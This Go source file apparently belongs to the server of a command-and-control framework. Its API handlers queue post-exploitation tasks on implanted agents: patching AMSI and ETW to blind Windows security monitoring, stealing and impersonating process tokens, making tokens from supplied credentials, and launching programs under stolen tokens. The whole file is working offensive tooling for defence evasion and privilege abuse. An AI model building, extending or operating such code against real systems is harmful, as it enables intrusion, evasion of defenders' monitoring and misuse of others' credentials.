package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// AMSIBypass queues an AMSI patch on the agent.
// POST /api/v1/agent/:id/bypass/amsi
// Body: {} or { "pid": 1234 }  (omit pid to patch agent's own process)
func (h *Handlers) AMSIBypass(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		PID uint32 `json:"pid"`
	}
	c.ShouldBindJSON(&req)

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "amsi_bypass",
		BypassTargetPID: req.PID,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         15,
	}
	h.server.CommandQueue.Add(agentID, cmd)

	target := "agent process"
	if req.PID > 0 {
		target = fmt.Sprintf("PID %d", req.PID)
	}
	h.server.Logger.LogCommandExecution(agentID, "AMSI_BYPASS", target, true)
	h.APIResponse(c, true, "AMSI bypass queued", map[string]interface{}{
		"command_id": cmd.ID,
		"target":     target,
	}, "")
}

// ETWBypass queues an ETW patch on the agent.
// POST /api/v1/agent/:id/bypass/etw
// Body: {} or { "pid": 1234 }
func (h *Handlers) ETWBypass(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		PID uint32 `json:"pid"`
	}
	c.ShouldBindJSON(&req)

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "etw_bypass",
		BypassTargetPID: req.PID,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         15,
	}
	h.server.CommandQueue.Add(agentID, cmd)

	target := "agent process"
	if req.PID > 0 {
		target = fmt.Sprintf("PID %d", req.PID)
	}
	h.server.Logger.LogCommandExecution(agentID, "ETW_BYPASS", target, true)
	h.APIResponse(c, true, "ETW bypass queued", map[string]interface{}{
		"command_id": cmd.ID,
		"target":     target,
	}, "")
}

// TokenList queues a token enumeration on the agent.
// POST /api/v1/agent/:id/token/list
func (h *Handlers) TokenList(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "token_list",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TOKEN_LIST", "", true)
	h.APIResponse(c, true, "Token list queued", map[string]interface{}{"command_id": cmd.ID}, "")
}

// TokenSteal queues a token steal + impersonation.
// POST /api/v1/agent/:id/token/steal
// Body: { "pid": 1234 }
func (h *Handlers) TokenSteal(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		PID uint32 `json:"pid" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.PID == 0 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "pid is required")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "token_impersonate",
		TokenPID:      req.PID,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TOKEN_STEAL", fmt.Sprintf("PID=%d", req.PID), true)
	h.APIResponse(c, true, "Token steal queued", map[string]interface{}{
		"command_id": cmd.ID,
		"pid":        req.PID,
	}, "")
}

// TokenMake queues a LogonUser-based token creation.
// POST /api/v1/agent/:id/token/make
// Body: { "user": "admin", "domain": "CORP", "pass": "P@ss!" }
func (h *Handlers) TokenMake(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		User   string `json:"user"   binding:"required"`
		Domain string `json:"domain"`
		Pass   string `json:"pass"   binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	domain := req.Domain
	if domain == "" {
		domain = "."
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "token_make",
		TokenUser:     req.User,
		TokenDomain:   domain,
		TokenPass:     req.Pass,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TOKEN_MAKE", fmt.Sprintf("%s\\%s", domain, req.User), true)
	h.APIResponse(c, true, "Token make queued", map[string]interface{}{
		"command_id": cmd.ID,
		"user":       domain + "\\" + req.User,
	}, "")
}

// TokenRevert queues a RevertToSelf operation.
// POST /api/v1/agent/:id/token/revert
func (h *Handlers) TokenRevert(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "token_revert",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       10,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TOKEN_REVERT", "", true)
	h.APIResponse(c, true, "Token revert queued", map[string]interface{}{"command_id": cmd.ID}, "")
}

// TokenRunAs spawns a process under a stolen or created token.
// POST /api/v1/agent/:id/token/runas
// Body: { "exe": "cmd.exe", "args": "/c whoami", "pid": 0, "user": "", "domain": "", "pass": "" }
// Either pid (steal token) or user+pass (make token) must be provided.
func (h *Handlers) TokenRunAs(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		Exe    string `json:"exe"`
		Args   string `json:"args"`
		PID    uint32 `json:"pid"`
		User   string `json:"user"`
		Domain string `json:"domain"`
		Pass   string `json:"pass"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Exe == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "exe is required")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "token_runas",
		TokenExe:      req.Exe,
		Command:       req.Args,
		TokenPID:      req.PID,
		TokenUser:     req.User,
		TokenDomain:   req.Domain,
		TokenPass:     req.Pass,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TOKEN_RUNAS", req.Exe, true)
	h.APIResponse(c, true, "Token runas queued", map[string]interface{}{
		"command_id": cmd.ID,
		"exe":        req.Exe,
	}, "")
}
